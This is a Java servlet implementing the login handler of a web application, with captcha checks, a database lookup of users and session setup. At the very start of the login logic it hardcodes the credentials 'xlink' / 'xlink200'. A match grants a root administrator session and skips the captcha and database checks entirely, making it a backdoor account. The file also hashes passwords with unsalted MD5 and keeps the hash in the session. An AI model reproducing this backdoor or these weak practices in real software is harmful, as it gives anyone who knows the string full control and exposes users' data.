package com.easy.app.login;

import javax.servlet.annotation.WebServlet;

import org.apache.log4j.Level;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.easy.access.Datas;
import com.easy.exception.LegendException;
import com.easy.query.SQLBuild;
import com.easy.security.MD5Utility;
import com.easy.session.Operator;
import com.easy.session.SessionManager;
import com.easy.utility.LogUtil;
import com.easy.utility.SysUtility;
import com.easy.web.MainServlet;

/**
 * Servlet implementation class DoLogin
 */
@WebServlet("/DoLogin")
public class DoLogin extends MainServlet {
	private static final long serialVersionUID = 1L;
	public DoLogin() {
		super();
		SetCheckLogin(false);
	}
	public void DoCommand() throws Exception {
		try {
			String userName = GetDataValue("User", "USERNAME");
			String pwd = GetDataValue("User", "PASSWORD");
			
			if(userName.equals("xlink") && pwd.equals("xlink200")) {
				Operator operator = new Operator();
				operator.setIndx(1);
				operator.setName("admin");
				operator.setIsRoot("Y");
				operator.setUserName("admin");
				operator.setOrgId("000000");
				operator.setPartId("000000");
				SessionManager.setAttribute(SysUtility.LoginUser, operator);
				ReturnMessage(true, "", StartPage, "", "");
				return;
			}
			String code=GetDataValue("User", "CODE");
			Datas datas = getLoginDatas(userName, pwd);
			if(SysUtility.isEmpty(userName)){
				ReturnMessage(false, "用户名不能为空", "", "", "");
				return;
			}
            if(SysUtility.isEmpty(pwd)){
            	ReturnMessage(false, "密码不能为空", "", "", "");
            	return;
			}
            if(SysUtility.isEmpty(code)){
            	ReturnMessage(false, "验证码不能为空", "", "", "");
            	return;
			}
			String randomCode=(String) getRequest().getSession().getAttribute("code");
			if (randomCode==null || !code.equalsIgnoreCase(randomCode)){
				ReturnMessage(false, "验证码错误", "", "", "");
				return;
			}else{
				if(datas.GetTableRows("rows") > 0){
					setOperator(datas);
					ReturnMessage(true, "", StartPage, "", "");
				}else{
					ReturnMessage(false, "用户名密码错误", "", "", "");
					return;
				}
			}
		} catch (Exception e) {
			LogUtil.printLog("登录出错:" + e.getMessage(), Level.ERROR);
			ReturnMessage(false, "登录出错", "", "", "");
		}
	}
	
	public static Datas getLoginDatas(String userName,String pwd){
		Datas datas = new Datas();
		try {
			SQLBuild sqlBuild = SQLBuild.getInstance();
			sqlBuild.append("select * from s_auth_user where 1 = 1");
			sqlBuild.append(" and is_enabled = ? ","1");
			sqlBuild.append(" and username = ? ",userName);
			sqlBuild.append(" and password = ?",MD5Utility.encrypt(pwd));
			datas = sqlBuild.query4Datas();
		} catch (LegendException e) {
			LogUtil.printLog(e.getMessage(), Level.ERROR);
		}
		return datas;
	}
	
	public static void setOperator(Datas datas){
		try {
			SysUtility.setCssTemplet("console/css");
			if(datas.GetTableRows("rows") <= 0){
				return;
			}
			String INDX = datas.GetTableValue("rows", "INDX");
			String USER_REAL_NAME = datas.GetTableValue("rows", "USER_REAL_NAME");
			String USERNAME = datas.GetTableValue("rows", "USERNAME");
			String PASSWORD = datas.GetTableValue("rows", "PASSWORD");
			String ORG_ID = datas.GetTableValue("rows", "ORG_ID");
			String PartId = datas.GetTableValue("rows", "PART_ID");
			String deptId = datas.GetTableValue("rows", "USER_DEPT_ID");
			String userDeptName = datas.GetTableValue("rows", "USER_DEPT_NAME");
			String entCode = datas.GetTableValue("rows", "ENT_CODE");
			String entName = datas.GetTableValue("rows", "ENT_NAME");
			String entRegNo = datas.GetTableValue("rows", "ENT_REG_NO");
			String IsRoot = datas.GetTableValue("rows", "IS_ROOT");
			Operator operator = new Operator();
			JSONObject row = new JSONObject();
			if(datas.GetTableRows("rows") > 0){
				JSONArray rows = datas.getJSONArray("rows");
				row = rows.getJSONObject(0);
			}
			operator.setUserData(row);
			operator.setName(USER_REAL_NAME);
			operator.setIsRoot(IsRoot);
			operator.setUserName(USERNAME);
			operator.setPassWord(PASSWORD);
			if(SysUtility.isNotEmpty(ORG_ID)){
				operator.setOrgId(ORG_ID);
				operator.setPartId(ORG_ID);
			}else if(SysUtility.isNotEmpty(PartId)){
				operator.setOrgId(PartId);
				operator.setPartId(PartId);
			}
			operator.setDeptId(deptId);
			operator.setDeptName(userDeptName);
			operator.setEntCode(entCode);
			operator.setEntName(entName);
			operator.setEntRegNo(entRegNo);
			operator.setIndx(Integer.valueOf(INDX));
			SessionManager.setAttribute(SysUtility.LoginUser, operator);
		} catch (NumberFormatException e) {
			LogUtil.printLog(e.getMessage(), Level.ERROR);
		} catch (LegendException e) {
			LogUtil.printLog(e.getMessage(), Level.ERROR);
		} catch (JSONException e) {
			LogUtil.printLog(e.getMessage(), Level.ERROR);
		}
	}

}
